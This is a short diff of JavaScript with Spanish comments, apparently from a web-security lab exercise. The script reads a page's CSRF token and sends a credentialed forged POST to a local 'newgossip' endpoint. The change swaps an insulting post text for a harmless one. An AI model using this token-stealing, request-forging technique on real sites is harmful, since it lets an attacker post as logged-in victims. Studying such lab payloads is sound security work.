@@ -10,7 +10,7 @@ var doc = parser.parseFromString(response, 'text/html');
 var token = doc.getElementsByName("_csrf_token")[0].value; //Hace esto último para quedarse únicamente con el primer valor que se encuentre
 
 var req2 = new XMLHttpRequest();
-var data = "title=Mi%20jefe%20es%20un%20cabrón&subtitle=JEFE%20CABRONAZO&text=PERRRRRO&_csrf_token=" + token;
+var data = "title=Mi%20casa%20es%20muy%20bonita&subtitle=Que%20casa&text=preciosa&_csrf_token=" + token;
 req2.open('POST', 'http://localhost:10007/newgossip', false);
 req2.withCredentials=true;
 // Esto de abajo hay que ponerlo si o si, es muy importante. Sale en una de las cabeceras del Burpsuite
